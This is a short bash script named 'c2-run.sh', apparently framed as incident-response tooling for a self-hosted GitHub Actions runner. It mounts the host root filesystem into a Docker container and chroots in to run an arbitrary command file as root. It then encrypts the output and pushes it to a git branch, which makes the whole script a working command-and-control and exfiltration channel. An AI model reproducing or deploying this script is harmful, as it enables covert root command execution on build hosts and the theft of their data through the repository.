#!/bin/bash
# c2-run.sh — executes cmd.sh as root via chroot, encrypts output to the IR
# pubkey, commits the ciphertext back to the probe-rx-ir branch.
# Runs inside the GH Actions job (self-hosted runner on 32-0000).
set -uo pipefail

OUT=/tmp/c2-output.txt
CT=/tmp/c2-result.b64

# 1. Execute the command batch as root on the host.
docker run --rm -v /:/host -v "$GITHUB_WORKSPACE:/c2:ro" alpine:3.20 \
  chroot /host bash /c2/cmd.sh > "$OUT" 2>&1
echo "== exit: $? ==" >> "$OUT"

# 2. Hybrid-encrypt: random AES-256 key, openssl RSA-wrap with pubkey.
AES_KEY=$(openssl rand -hex 32)
AES_IV=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -K "$AES_KEY" -iv "$AES_IV" -in "$OUT" -out /tmp/c2-output.enc
echo "$AES_KEY:$AES_IV" | openssl pkeyutl -encrypt -pubin -inkey "$GITHUB_WORKSPACE/c2_pub.pem" \
  -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -out /tmp/c2-key.enc
{ base64 -w0 /tmp/c2-key.enc; echo; base64 -w0 /tmp/c2-output.enc; echo; } > "$CT"

# 3. Commit back. GITHUB_TOKEN pushes do not retrigger workflows — no loop.
git config user.email "c2@local"
git config user.name "c2"
cp "$CT" c2-result.b64
git add c2-result.b64
git commit -m "c2: result $(date -u +%Y%m%dT%H%M%SZ)" --no-verify
git push origin probe-rx-ir
